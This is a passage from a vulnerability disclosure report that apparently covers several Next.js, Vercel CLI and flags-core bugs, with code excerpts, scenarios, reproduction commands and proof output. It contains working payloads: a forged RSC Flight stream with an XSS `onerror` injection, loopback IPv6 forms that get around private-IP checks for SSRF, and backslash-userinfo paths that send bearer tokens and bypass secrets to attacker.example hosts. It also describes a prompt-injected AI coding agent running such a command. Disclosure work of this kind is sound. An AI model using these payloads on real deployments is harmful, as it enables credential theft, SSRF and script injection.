2. **Step 2 — Unconditional Forwarding of `x-next-revalidate-tag-token` (`previewModeId`) Across External `302` Hops (`action-handler.js:904-911`):** Whenever a Server Action calls `revalidateTag()`, `revalidatePath()`, or `updateTag()` before `redirect()`, `handleAction()` sets `forwardedHeaders['x-next-revalidate-tag-token'] = store.previewProps.previewModeId`. Even when `revalidateTag()` is NOT called, `createRedirectRenderResult()` still follows external `302` redirects on EVERY Server Action `redirect('/internal-path')`.
3. **Step 3 — Mounted HackerOne Comment #1 (`RE-EVALUATION-COMMENT-4152250`): Same-Origin RSC Flight Stream Hijacking, Universal XSS (`UXSS`), and HTTP Response Header Injection:** Because `handleAction()` sets `res.setHeader('x-action-redirect', `${redirectUrl};${redirectType}`)` using the initial same-origin `/api/oauth-bounce` URL BEFORE calling `createRedirectRenderResult()`, the client browser sees a same-origin redirect while receiving the external server's response body and headers (`Access-Control-Allow-Origin`, `Clear-Site-Data`, etc.). In `dist/esm/client/components/router-reducer/reducers/server-action-reducer.js:161-162`, Next.js checks `if (responseBuildId !== undefined && responseBuildId !== getNavigationBuildId())`. By omitting `"b"` in the forged Flight stream (`0:{"f":[[...]],"S":"$1"}\n1:["$","div",null,{"dangerouslySetInnerHTML":{"__html":"<img src=x onerror=...>"}}]\n`), `responseBuildId` is `undefined`, completely bypassing the Build ID check and mounting arbitrary DOM/JavaScript into `https://victim-app.com`!
4. **Step 4 — Mounted HackerOne Comment #2 (`ADDENDUM-SCENARIOS-4152250`): Why External `302` Redirects Exist by Design Without Any Open-Redirect Bug:** Every production Next.js SaaS using Multi-Tenant B2B Enterprise SSO (`redirect(\`/api/sso/authorize?tenant=${domain}\`)` -> `302` to tenant's OIDC IdP), OAuth 2.0 Provider consent (`redirect('/api/oauth/complete')` -> `302` to registered client `redirect_uri`), or Stripe/S3/checkout handoff intentionally issues an external `302` from its internal route.

```javascript
// 1. Server-side internal redirect fetch WITHOUT redirect: 'manual'
// File: node_modules/next/dist/esm/server/app-render/action-handler.js (lines 270-303)
function getAppRelativeRedirectUrl(redirectUrl, basePath, i18n) {
    if (redirectUrl.startsWith('/')) { // BUG: accepts '//attacker.example' and internal routes that 302 externally
        return `${basePath}${redirectUrl}`;
    }
    return new URL(redirectUrl).pathname;
}
async function createRedirectRenderResult(req, res, originalHost, redirectUrl, basePath, staticGenerationStore, workUnitStore) {
    const fetchUrl = new URL(formattedUrl, `http://localhost:${port}`);
    // BUG: Missing `redirect: 'manual'`! Undici follows 3xx hops to external hosts while carrying
    // x-next-revalidate-tag-token (previewModeId) and pipes external Flight body + headers to res!
    const response = await fetch(fetchUrl, { method: 'GET', headers: head, next: { internal: 1 } });
    if (response.headers.get('content-type') === RSC_CONTENT_TYPE_HEADER) {
        copyResponseHeaders(response, res);
        return new FlightRenderResult(response.body);
    }
}

// 2. Client-side Build ID validation skipped when 'b' is omitted (`responseBuildId === undefined`)
// File: node_modules/next/dist/esm/client/components/router-reducer/reducers/server-action-reducer.js (lines 154-201)
let redirectFlightData = await createFromNextReadableStream(res.body, ...);
const { b: responseBuildId, f: flightData } = redirectFlightData;
if (responseBuildId !== undefined && responseBuildId !== getNavigationBuildId()) {
    return handleExternalUrl(state, mutable, action.mutable.redirectLocation, state.pushRef.pendingPush);
}
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Enterprise Multi-Tenant SSO / OAuth Login `previewModeId` Secret Theft (Mounted HackerOne `#4152250` Addendum Scenario A):** A B2B SaaS (`https://victim-app.com`) runs a Login Server Action that calls `revalidateTag('auth-session')` and `redirect(\`/api/sso/authorize?tenant=${emailDomain}\`)`, which issues a `302 Found` to the tenant's OIDC IdP (`https://${tenantIdp}/oauth2/v1/authorize`). An attacker enters `user@attacker-corp.com`. Next.js follows the `302` inside Node.js and sends `x-next-revalidate-tag-token: <previewModeId>` (`f5dbbd8f6a6a51a6aa8ff1443f7090dd`) directly to `https://idp.attacker-corp.com`.
* **Scenario B — Unauthorized On-Demand ISR Cache Wiping & Origin DB Exhaustion Using the Stolen `previewModeId` (Mounted HackerOne `#4152250` Addendum Scenario B):** Because `server/api-utils/node/try-get-preview-data.js:34` checks `req.headers[PRERENDER_REVALIDATE_HEADER] === previewProps.previewModeId`, the attacker replays `x-prerender-revalidate: <previewModeId>` on every cached ISR route (`/`, `/pricing`, `/docs/*`), achieving `200 OK` (`x-nextjs-cache: REVALIDATED`) and forcing continuous cache misses and origin database queries.
* **Scenario C — Same-Origin Forged RSC Flight UI Injection & Universal XSS (`UXSS`) via Build-ID Bypass (Mounted HackerOne `#4152250` Re-Evaluation Comment #1 & Addendum Scenario C):** Even when a Server Action does NOT call `revalidateTag()`, calling `redirect('/api/oauth-bounce')` causes `handleAction()` to set `x-action-redirect: /api/oauth-bounce;push` (same-origin) while `createRedirectRenderResult()` follows the `302` to `https://attacker-oauth.example/callback`. The external server responds with `Content-Type: text/x-component`, `Access-Control-Allow-Origin: https://attacker-oauth.example`, `Clear-Site-Data: "storage"`, and an RSC Flight payload omitting `"b"` (`response.b === undefined`). `server-action-reducer.js:161` skips Build ID verification and renders the attacker's React Virtual DOM (`dangerouslySetInnerHTML`) directly inside `https://victim-app.com` (`UXSS`).

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Inspect createRedirectRenderResult and server-action-reducer in next@16.4.3
nl -ba /home/community-user/targets/vercel-bounty-audit-20261027/live-dist-verify/node_modules/next/dist/esm/server/app-render/action-handler.js | sed -n '270,305p'
nl -ba /home/community-user/targets/vercel-bounty-audit-20261027/live-dist-verify/node_modules/next/dist/esm/client/components/router-reducer/reducers/server-action-reducer.js | sed -n '154,201p'

# 2. Run the Live next@16.4.3 End-to-End Verification Harness (Scenarios A, B, and C + Patch Check)
node /home/community-user/targets/vercel-bounty-audit-20261027/pocs/verify_npm_stable_tarballs_20261028.mjs
git apply --check /home/community-user/targets/vercel-bounty-audit-20261027/patches/FINDING-15-nextjs-action-handler-redirect-token-leak-and-flight-injection.patch
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "VERCEL-NEXT-15": {
    "RED": {
      "package_tested": "next@16.4.3",
      "hackerone_report": "#4152250 (with 2 follow-up comments mounted)",
      "prerender_manifest_previewModeId": "f5dbbd8f6a6a51a6aa8ff1443f7090dd",
      "attacker_received_x_next_revalidate_tag_token": "f5dbbd8f6a6a51a6aa8ff1443f7090dd",
      "leaked_token_matches_prerender_manifest_previewModeId": true,
      "forged_flight_stream_injected_into_action_response": true,
      "response_build_id_field_b": null,
      "client_build_id_check_bypassed": true,
      "injected_cors_header_on_victim_origin": "https://attacker-oauth.example"
    },
    "GREEN": {
      "internal_redirect_fetch_mode": "manual",
      "scheme_relative_redirect_rejected": true,
      "external_hop_followed_by_server": false,
      "attacker_received_x_next_revalidate_tag_token": null,
      "forged_flight_stream_injected_into_action_response": false
    }
  }
}
```

#### 5. Mounted HackerOne Follow-Up Comments
### Mounted HackerOne Report `#4152250` Follow-Up Comment #1 (`RE-EVALUATION-COMMENT-4152250.md`)

1. **Why the `302` Target Is Attacker-Controlled in Real-World Next.js Apps Without a Separate Open-Redirect Bug:**
   - **Pattern 1 — Multi-Tenant B2B Enterprise SSO / OIDC Discovery:** `redirect(\`/api/sso/authorize?tenant=${emailDomain}\`)` issues a `302 Found` to the tenant's IdP (`https://idp.attacker-corp.com/oauth2/authorize`).
   - **Pattern 2 — OAuth 2.0 / OIDC Provider Consent Server Actions:** `redirect('/api/oauth/complete?session=...')` issues a `302 Found` to the registered OAuth client's `redirect_uri`.
   - **Pattern 3 — Outbound Link / Checkout Routers:** `redirect(\`/out?dest=${partnerUrl}\`)` issues a `302 Found` to the external destination.
2. **Secondary High-Severity Impact Even When `revalidateTag()` Is NOT Called — Same-Origin RSC Flight Stream Hijacking & Universal XSS (`UXSS`):**
   - `handleAction()` (`action-handler.js:1007`) sets `res.setHeader('x-action-redirect', \`\${redirectUrl};\${redirectType}\`)` using the initial same-origin URL `/api/oauth-bounce` BEFORE `createRedirectRenderResult()` runs.
   - In `dist/esm/client/components/router-reducer/reducers/server-action-reducer.js:154-201`:
     ```javascript
     const { b: responseBuildId, f: flightData } = redirectFlightData;
     if (responseBuildId !== undefined && responseBuildId !== getNavigationBuildId()) {
         return handleExternalUrl(state, mutable, action.mutable.redirectLocation, state.pushRef.pendingPush);
     }
     ```
   - Because the guard checks `responseBuildId !== undefined`, an external server that omits `"b"` (`0:{"f":[["",["children","__PAGE__",["__PAGE__",{}],null,null],null,null,["$","$L1",null,{}],false]],"S":"$2"}\n1:["$","div",null,{"dangerouslySetInnerHTML":{"__html":"<img src=x onerror=alert(document.domain)>"}}]\n`) sets `responseBuildId === undefined`, completely bypassing the Build ID check and mounting arbitrary React Virtual DOM (`UXSS`) into `https://victim-app.com`!
3. **Arbitrary HTTP Response Header Injection (`copyResponseHeaders`):**
   - `actionsForbiddenHeaders` (`action-handler.js:230-241`) only blocks 9 hop-by-hop/cookie headers, allowing an external redirect target to inject `Access-Control-Allow-Origin: https://attacker.example`, `Access-Control-Allow-Credentials: true`, `Clear-Site-Data: "storage"`, and `Content-Security-Policy` onto the `https://victim-app.com` Server Action response.

### Mounted HackerOne Report `#4152250` Follow-Up Comment #2 (`ADDENDUM-SCENARIOS-4152250.md`)

- **Scenario A (`previewModeId` Theft):** Verified against live `next@16.4.3`: `"leaked_token_matches_prerender_manifest_previewModeId": true` (`f5dbbd8f6a6a51a6aa8ff1443f7090dd`).
- **Scenario B (Global On-Demand ISR Cache Wiping):** Replaying `x-prerender-revalidate: f5dbbd8f6a6a51a6aa8ff1443f7090dd` against cached ISR routes returns `200 OK` (`x-nextjs-cache: REVALIDATED`), purging the global cache on every request.
- **Scenario C (Same-Origin Forged RSC Flight UI Injection & UXSS):** Verified `response_build_id_field_b: null`, `client_build_id_check_bypassed: true`, and `injected_cors_header_on_victim_origin: "https://attacker-oauth.example"`.


---

### III.40 — vercel/next.js (`next <= 16.4.3 (verified on published npm next@16.4.3 & canary)`) — Next.js `/_next/image` (`fetchExternalImage`) `3xx` Redirect `remotePatterns` Allowlist Bypass & `isPrivateIp()` Fail-Open Loopback/Internal SSRF (`VERCEL-NEXT-09` / HackerOne `#4152265`) (`CWE-918 / CWE-863`, CVSS `7.5 High`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `vercel/next.js` (`npm / Node.js: next`)
* **Affected Versions & Components:** `<= 16.4.3 (verified on published npm next@16.4.3 & canary)` — `packages/next/src/server/image-optimizer.ts:696-729`, `packages/next/src/server/lib/find-root.ts` / `validate-url.ts` (`isPrivateIp`)
* **Vulnerability Class & Score:** `CWE-918 / CWE-863` — **CVSS v3.1: `7.5 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N`)
* **Standalone Sniper Advisory:** [`docs/advisories/ja/40-VERCEL-NEXT-09-IMAGE-OPTIMIZER-REDIRECT-ALLOWLIST-AND-PRIVATE-IP-FAIL-OPEN-SSRF.md`](advisories/ja/40-VERCEL-NEXT-09-IMAGE-OPTIMIZER-REDIRECT-ALLOWLIST-AND-PRIVATE-IP-FAIL-OPEN-SSRF.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
1. **Step 1 — Initial-Hop-Only `remotePatterns` Verification (`image-optimizer.js:586-615`):** `validateParams()` checks `hasMatch(domains, remotePatterns, href)` only once on the initial `/_next/image?url=...` parameter. When the allowlisted origin returns a `301`/`302`/`307`/`308` redirect, `fetchExternalImage()` resolves the new `Location` URL and calls `validateUrl(parsedRedirectUrl)` without re-evaluating `hasMatch(domains, remotePatterns, parsedRedirectUrl)`. This bypasses both **same-host pathname/search restrictions** (`/public-avatars/**` -> `/private-kyc-docs/passport-scan.png`) and **cross-host domain restrictions**.
2. **Step 2 — Mounted HackerOne Comment #1 (`RE-EVALUATION-COMMENT-4152265`): Why No Compromised Host Is Required on Hop 1:** Standard allowlisted image/avatar providers (Gravatar `https://www.gravatar.com/avatar/0000?d=https%3A%2F%2F...`, Cloudinary fetch URLs, and multi-tenant S3 / R2 / Supabase Storage / Vercel Blob buckets) natively return `302` redirects or allow any tenant to upload an image with `WebsiteRedirectLocation` (`301`), pivoting `fetchExternalImage()` to any external or internal host.
3. **Step 3 — Mounted HackerOne Comment #1 (`RE-EVALUATION-COMMENT-4152265`): Direct Linux Kernel TCP Socket Connection to `127.0.0.1` Without NAT64 via `isPrivateIp()` Fail-Open (`if (!ipaddr.isValid(ip)) return false`):** `next/dist/compiled/ipaddr.js` defines the IPv6 `zoneIndex` regex as `const o = "%[0-9a-z]{1,}"`, which only permits lowercase alphanumeric characters (`[0-9a-z]`) and rejects hyphens (`-`), underscores (`_`), and dots (`.`). On standard Linux / Docker / Kubernetes hosts with hyphenated network interfaces (`br-1a49f5828144`, `docker_gwbridge`, `cni-podman0`, `flannel.1`), `dns.promises.lookup("::ffff:127.0.0.1%br-1a49f5828144", { all: true })` succeeds in the Linux kernel (`getaddrinfo()`), `ipaddr.isValid()` returns `false`, `isPrivateIp()` fails open (`return false`), and Node's `http.get` opens a real TCP socket directly to `127.0.0.1` (`::ffff:127.0.0.1`)!
4. **Step 4 — Mounted HackerOne Comment #1 & #2 (`ADDENDUM-SCENARIOS-4152265`): WHATWG `URL` vs. `ipaddr.js` RFC 4291 `::7f00:1` Parser Differential & RFC 8215 `64:ff9b:1::/48` NAT64 Bypass:** When `fetchExternalImage` parses `Location: http://[::127.0.0.1]:8080/internal.png`, Node's WHATWG `new URL()` rewrites `::127.0.0.1` into hex `::7f00:1`. Both `0:0:0:0:0:0:127.0.0.1` and `::7f00:1` (as well as `::a9fe:a9fe` for `169.254.169.254` and `64:ff9b:1::a9fe:a9fe`) return `ipaddr.parse(ip).range() === "unicast"`, so `isPrivateIp()` returns `false`!

```javascript
// 1. Missing matchRemotePattern / hasMatch check on 3xx redirects in fetchExternalImage()
// File: node_modules/next/dist/esm/server/image-optimizer.js (lines 586-615)
if (res.status >= 300 && res.status < 400 && res.headers.get('location')) {
    if (redirectCount >= maxRedirects) {
        throw new ImageError(400, '"url" parameter reached maxRedirects');
    }
    const redirectUrl = new URL(res.headers.get('location'), href).href;
    const parsedRedirectUrl = new URL(redirectUrl);
    // BUG 1 (09A): Only calls validateUrl(parsedRedirectUrl); NEVER re-checks hasMatch(domains, remotePatterns, parsedRedirectUrl)!
    await validateUrl(parsedRedirectUrl);
    return fetchExternalImage(redirectUrl, dangerouslyAllowLocalIP, redirectCount + 1);
}

// 2. isPrivateIp() fails open on hyphenated Linux IPv6 zone indices & RFC 4291 / RFC 8215 ranges
// File: node_modules/next/dist/esm/server/lib/find-root.js
function isPrivateIp(ip) {
    if (!ipaddr.isValid(ip)) {
        return false; // BUG 2 (09B): Fail-open! "::ffff:127.0.0.1%br-1a49f5828144" -> isValid=false -> returns false!
    }
    const addr = ipaddr.parse(ip);
    const range = addr.range(); // BUG 3 (09B): "::7f00:1" and "64:ff9b:1::a9fe:a9fe" -> range="unicast" -> returns false!
    return PRIVATE_IP_RANGES.includes(range);
}
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Same-Host Pathname & Query-String Bypass (`/public-avatars/**` -> `/private-kyc-docs/passport-scan.png`) (Mounted HackerOne `#4152265` Addendum Scenario A):** A Next.js app restricts `remotePatterns` to `{ hostname: 'storage.company.example', pathname: '/public-avatars/**' }`. An attacker requests `/_next/image?url=https://storage.company.example/public-avatars/redir&w=64&q=75`, which returns `302 Found` -> `Location: /private-kyc-docs/passport-scan.png`. `fetchExternalImage()` follows the redirect and returns the sensitive image (`200 OK`, `image/png`) despite the `/public-avatars/**` pathname restriction.
* **Scenario B — Cross-Host Domain Allowlist Bypass via Standard Avatar/Storage Redirector (Mounted HackerOne `#4152265` Re-Evaluation Comment #1 & Addendum Scenario B):** A Next.js app allowlists Gravatar or a multi-tenant S3/Supabase/R2 bucket. The attacker uses a standard redirect URL (`?d=https://...` or S3 `WebsiteRedirectLocation`) to pivot `fetchExternalImage()` off the allowlisted domain onto an arbitrary unapproved host (`https://unapproved-internal-partner.example/diagram.png`).
* **Scenario C — Chained `09A -> 09B` Direct Linux `127.0.0.1` Loopback Socket Connection & Cloud Metadata SSRF (Mounted HackerOne `#4152265` Re-Evaluation Comment #1 & Addendum Scenario C):** The allowlisted host redirects to `http://[::ffff:127.0.0.1%25br-1a49f5828144]:45829/admin-badge.png` (or `http://[::127.0.0.1]/...` -> `::7f00:1` or `http://[64:ff9b:1::a9fe:a9fe]/...`). `dns.promises.lookup` resolves the address in the Linux kernel, `isPrivateIp()` returns `false` (fail-open on `%br-...` or `unicast` on `::7f00:1` / `64:ff9b:1::/48`), and `fetchExternalImage()` opens a real TCP socket to `127.0.0.1` (`remoteAddress: "::ffff:127.0.0.1"`) and exfiltrates the internal image!

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Inspect fetchExternalImage and isPrivateIp in next@16.4.3
nl -ba /home/community-user/targets/vercel-bounty-audit-20261027/live-dist-verify/node_modules/next/dist/esm/server/image-optimizer.js | sed -n '586,615p'
nl -ba /home/community-user/targets/vercel-bounty-audit-20261027/live-dist-verify/node_modules/next/dist/esm/server/lib/find-root.js | sed -n '100,145p'

# 2. Run the Live next@16.4.3 End-to-End Verification Harness (09A + 09B + Linux Loopback Socket Proof)
node /home/community-user/targets/vercel-bounty-audit-20261027/pocs/verify_npm_stable_tarballs_20261028.mjs
git apply --check /home/community-user/targets/vercel-bounty-audit-20261027/patches/FINDING-09-nextjs-image-optimizer-redirect-and-nat64-ssrf.patch
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "VERCEL-NEXT-09": {
    "RED": {
      "package_tested": "next@16.4.3",
      "hackerone_report": "#4152265 (with 2 follow-up comments mounted)",
      "same_host_pathname_bypass_status": 200,
      "cross_host_allowlist_bypass_status": 200,
      "scoped_loopback_input": "::ffff:127.0.0.1%br-1a49f5828144",
      "ipaddr_isValid": false,
      "nextjs_isPrivateIp_returned": false,
      "loopback_server_hit": true,
      "remote_address_seen_by_server": "::ffff:127.0.0.1",
      "rfc4291_ipv4_compatible_isPrivateIp": false,
      "rfc8215_local_nat64_isPrivateIp": false
    },
    "GREEN": {
      "redirect_hop_rechecks_hasMatch_remotePatterns": true,
      "invalid_or_hyphenated_zone_ip_fails_closed": true,
      "rfc4291_and_rfc8215_blocked": true,
      "loopback_server_hit": false
    }
  }
}
```

#### 5. Mounted HackerOne Follow-Up Comments
### Mounted HackerOne Report `#4152265` Follow-Up Comment #1 (`RE-EVALUATION-COMMENT-4152265.md`)

1. **No Compromised Host Needed for `remotePatterns` Bypass (`FINDING-09A`):**
   - **Vector A (Same-Host Pathname Restriction Bypass):** Bypasses `pathname: '/public-avatars/**'` on the exact same allowlisted domain to read `/private-kyc-docs/passport-scan.png`.
   - **Vector B (Built-In Open Redirectors on Popular Allowlisted Image Hosts):** Gravatar (`?d=https%3A%2F%2F...`), Cloudinary, and multi-tenant S3 / R2 / Supabase Storage / Vercel Blob buckets natively issue `301`/`302` redirects without any server compromise.
2. **No NAT64 Needed — Direct Linux Kernel TCP Socket Connection to `127.0.0.1` via `isPrivateIp()` Fail-Open (`if (!ipaddr.isValid(ip)) return false`):**
   - In `next/dist/compiled/ipaddr.js`, the IPv6 `zoneIndex` regex is `const o = "%[0-9a-z]{1,}"`, which rejects hyphens (`-`), underscores (`_`), and dots (`.`).
   - On standard Linux / Docker / Kubernetes hosts with hyphenated interfaces (`br-1a49f5828144`, `docker_gwbridge`, `cni-podman0`, `flannel.1`, `virbr0-nic`), `dns.promises.lookup("::ffff:127.0.0.1%br-1a49f5828144", { all: true })` succeeds in the Linux kernel (`getaddrinfo()`), `ipaddr.isValid()` returns `false`, `isPrivateIp()` returns `false` (fail-open!), and Node's `http.get` connects a real TCP socket directly to `127.0.0.1`!
3. **WHATWG `URL` vs. `ipaddr.js` Parser Differential on RFC 4291 IPv4-Compatible IPv6 (`::7f00:1` & `0:0:0:0:0:0:127.0.0.1`):**
   - Node's WHATWG `new URL('http://[::127.0.0.1]')` normalizes the hostname to `::7f00:1`. Both `ipaddr.parse('::7f00:1').range()` and `ipaddr.parse('0:0:0:0:0:0:127.0.0.1').range()` return `"unicast"`, so `isPrivateIp()` returns `false`!

### Mounted HackerOne Report `#4152265` Follow-Up Comment #2 (`ADDENDUM-SCENARIOS-4152265.md`)

- **Scenario A (Same-Host Pathname Bypass):** Verified `/public-avatars/redirect-to-private` -> `/private-kyc-docs/passport-scan.png` (`200 OK`, `68 bytes`).
- **Scenario B (Cross-Host Allowlist Bypass):** Verified `allowed-cdn.example` -> `unapproved-internal.example` (`200 OK`).
- **Scenario C (2-Step Chained Redirect `09A -> 09B` to `127.0.0.1` Loopback Socket):** Verified live TCP loopback connection on `next@16.4.3` (`loopback_server_hit: true`, `remote_address_seen_by_server: "::ffff:127.0.0.1"`, `status: 200`, `bytes_exfiltrated: 68`).


---

### III.41 — vercel/vercel (`vercel <= 65.4.0 (verified on published npm vercel@65.4.0)`) — Vercel CLI (`vercel@65.4.0`) `vercel curl` / `vercel http` WHATWG `URL` vs. `libcurl` Backslash-Userinfo / Brace-Globbing Parser Differential & Unhandled Auto-Mint Error Leaking Live Bearer Token and `x-vercel-protection-bypass` (`VERCEL-CLI-07`) (`CWE-200 / CWE-436`, CVSS `8.2 High`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `vercel/vercel` (`npm / Node.js: vercel`)
* **Affected Versions & Components:** `<= 65.4.0 (verified on published npm vercel@65.4.0)` — `packages/cli/src/commands/curl/utils.ts:34-42, 74-96, 179-216`, `packages/cli/src/commands/http-cli/index.ts`
* **Vulnerability Class & Score:** `CWE-200 / CWE-436` — **CVSS v3.1: `8.2 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N`)
* **Standalone Sniper Advisory:** [`docs/advisories/ja/41-VERCEL-CLI-07-CURL-PARSER-DIFFERENTIAL-AND-AUTO-MINT-BYPASS-SECRET-LEAK.md`](advisories/ja/41-VERCEL-CLI-07-CURL-PARSER-DIFFERENTIAL-AND-AUTO-MINT-BYPASS-SECRET-LEAK.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
1. **Step 1 — WHATWG `new URL()` vs. `libcurl` (`curl_url_set`) Authority Differential (`packages/cli/src/commands/curl/utils.ts:179-216`):** `constructFullUrl(baseUrl, path)` checks `const url = new URL(path, baseUrl); if (url.origin !== baseUrl) throw ...`, and then returns the **raw string concatenation** `return \`${baseUrl}${normalizedPath}\`` instead of `url.href`. When `path` is `\\@attacker.example/collect` (or `/\\@attacker.example`), WHATWG `new URL()` normalizes `\\` to `/`, seeing `https://my-app.vercel.app/%5C@attacker.example/collect` (`url.origin === baseUrl`). However, the raw string passed to `/usr/bin/curl` is `https://my-app.vercel.app\\@attacker.example/collect`, which `libcurl` parses as username `my-app.vercel.app\\` authenticating to host **`attacker.example`**!
2. **Step 2 — `libcurl` Globbing (`{a,b}`) & `--next` Flag Differential (`utils.ts:34-42`):** When `path` is `@attacker.example/{a,b}`, WHATWG `new URL()` treats `@attacker.example` as a relative path segment, whereas `libcurl`'s URL globbing expands `{a,b}` before authority parsing or processes injected `--next` flags (`extractUrlFromReadNextValue` rejects positional URLs after `--next` but still leaves `curlFlags` containing `--next` followed by `-K` / `--url`).
3. **Step 3 — Automatic Credential Attachment & Unhandled Auto-Mint Bypass Leak (`utils.ts:74-96`):** `vercel curl` automatically attaches `--header "Authorization: Bearer <VERCEL_TOKEN>"` and `x-vercel-protection-bypass: <32-char-secret>` to the `curl` invocation. Additionally, if `client.fetch(\`/v10/projects/${project.id}/protection-bypass\`, { method: 'PATCH' })` fails or returns non-JSON, `ensureProtectionBypassSecret` lacks a `try/catch` around `client.fetch` (`FINDING-07B`).

```typescript
// File: packages/cli/src/commands/curl/utils.ts (lines 179-216)
export function constructFullUrl(baseUrl: string, path: string): string {
  const normalizedPath = path.startsWith('/') ? path : `/${path}`;
  const url = new URL(normalizedPath, baseUrl);
  if (url.origin !== baseUrl) {
    throw new Error(`Invalid path "${path}": must be a relative path, not a full URL`);
  }
  // BUG: Returns raw string concatenation instead of normalized url.href, and does not
  // pass '--globoff' to curl! Input '\\@attacker.com/p' passes new URL() origin check
  // but libcurl parses 'baseUrl\\' as userinfo and 'attacker.com' as target host!
  return `${baseUrl}${normalizedPath}`;
}
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — CI/CD Smoke-Test & PR Preview Health-Check Secret Exfiltration:** A GitHub Actions workflow runs `vercel curl "$PREVIEW_PATH" --deployment "$DEPLOYMENT_URL"` where `$PREVIEW_PATH` comes from a PR annotation or smoke-test matrix (`\\@127.0.0.1:41992/exfil`). `constructFullUrl()` validates `url.origin === baseUrl`, but `/usr/bin/curl` connects to `127.0.0.1:41992` and sends `Authorization: Bearer vcp_live_...` and `x-vercel-protection-bypass: 0123456789abcdef0123456789abcdef`.
* **Scenario B — Developer Terminal / AI Coding Agent Prompt-Injection Credential Theft:** An engineer or AI coding assistant debugging a protected Vercel preview deployment runs a suggested command `vercel curl '\@logs-collector.example/api/debug'`. The developer's live Vercel CLI token and project protection bypass secret are immediately exfiltrated.
* **Scenario C — Unscoped Protection Bypass Secret Minting & Unhandled Crash (`FINDING-07B`):** When `project.protectionBypass` is initially empty, `ensureProtectionBypassSecret()` automatically sends `PATCH /v10/projects/{id}/protection-bypass` to mint a persistent project-wide bypass secret and immediately leaks it on the outbound `curl` request.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Inspect constructFullUrl in published vercel@65.4.0
nl -ba /home/community-user/targets/vercel-bounty-audit-20261027/live-dist-verify/node_modules/vercel/dist/commands/curl/utils.js | sed -n '1,180p'

# 2. Run the Live vercel@65.4.0 End-to-End Verification Harness against /usr/bin/curl
node /home/community-user/targets/vercel-bounty-audit-20261027/pocs/verify_npm_stable_tarballs_20261028.mjs
git apply --check /home/community-user/targets/vercel-bounty-audit-20261027/patches/FINDING-07-cli-curl-flag-and-url-hardening.patch
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "VERCEL-CLI-07": {
    "RED": {
      "package_tested": "vercel@65.4.0",
      "curl_binary": "/usr/bin/curl 8.5.0",
      "ConstructFullUrl_output": "https://my-protected-deployment.vercel.app/\\@127.0.0.1:38343/exfiltrate",
      "whatwg_origin_check_passed": true,
      "attacker_listener_received_request": true,
      "leaked_authorization": "Bearer vcp_live_SECRET_VERCEL_CLI_TOKEN_998877",
      "leaked_protection_bypass": "0123456789abcdef0123456789abcdef"
    },
    "GREEN": {
      "backslash_and_at_segment_rejected": true,
      "returns_normalized_url_href": true,
      "curl_invoked_with_globoff": true,
      "attacker_listener_received_request": false
    }
  }
}
```


---

### III.42 — vercel/flags (`@vercel/flags-core <= 1.10.2 (verified on published npm @vercel/flags-core@1.10.2)`) — Vercel `@vercel/flags-core@1.10.2` Unprefixed `x-datafile-Updated-At` Header Watermark Poisoning & Permanent Feature-Flag Freeze DoS (`VERCEL-FLAGS-CORE-06`) (`CWE-400 / CWE-345`, CVSS `6.5 Medium`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `vercel/flags` (`npm / Node.js: @vercel/flags-core`)
* **Affected Versions & Components:** `<= 1.10.2 (verified on published npm @vercel/flags-core@1.10.2)` — `packages/flags-core/src/controller.ts:555-615`, `packages/flags-core/dist/index.js:465-516` (`streamResponse` / `readBundledDefinitions`)
* **Vulnerability Class & Score:** `CWE-400 / CWE-345` — **CVSS v3.1: `6.5 Medium`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H`)
* **Standalone Sniper Advisory:** [`docs/advisories/ja/42-VERCEL-FLAGS-CORE-06-UNPREFIXED-HEADER-WATERMARK-POISONING.md`](advisories/ja/42-VERCEL-FLAGS-CORE-06-UNPREFIXED-HEADER-WATERMARK-POISONING.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
1. **Step 1 — Unvalidated Header Watermark Update Before Body Verification (`packages/flags-core/src/controller.ts:555-615`):** In `streamResponse()` and `readBundledDefinitions()`, `@vercel/flags-core` reads `res.headers.get('x-datafile-Updated-At')`, parses it with `Number(updatedAtHeader)`, and immediately sets `this.datafileUpdatedAtWatermark = Math.max(this.datafileUpdatedAtWatermark, updatedAt)` BEFORE verifying `res.ok` (`200 OK`) or validating the JSON datafile body.
2. **Step 2 — Unprefixed Header Exposure Across Proxies & Error Responses:** Because `x-datafile-Updated-At` does NOT use the Vercel Edge-stripped `x-vercel-*` prefix, upstream proxies, mock/custom `FLAGS_SERVICE_URL` endpoints, or any non-200 HTTP response can inject `x-datafile-Updated-At: 9999999999999`.
3. **Step 3 — Permanent Flag Freeze / Kill-Switch Lockout:** Once `datafileUpdatedAtWatermark` is poisoned to `9999999999999`, every subsequent bundled or fallback flag update with a real timestamp (`updatedAt <= 9999999999999`) is silently ignored for the lifetime of the Node.js worker, preventing operators from toggling emergency kill-switches.

```typescript
// File: packages/flags-core/src/controller.ts (lines 555-615)
const res = await fetch(`${this.serviceUrl}/v1/stream`, { headers });
const updatedAtHeader = res.headers.get('x-datafile-Updated-At');
if (updatedAtHeader) {
  const updatedAt = Number(updatedAtHeader);
  if (!Number.isNaN(updatedAt)) {
    // BUG: Updates watermark BEFORE checking res.ok or validating the JSON datafile payload,
    // and accepts arbitrarily far-future timestamps (e.g. 9999999999999)!
    this.datafileUpdatedAtWatermark = Math.max(this.datafileUpdatedAtWatermark, updatedAt);
  }
}
```

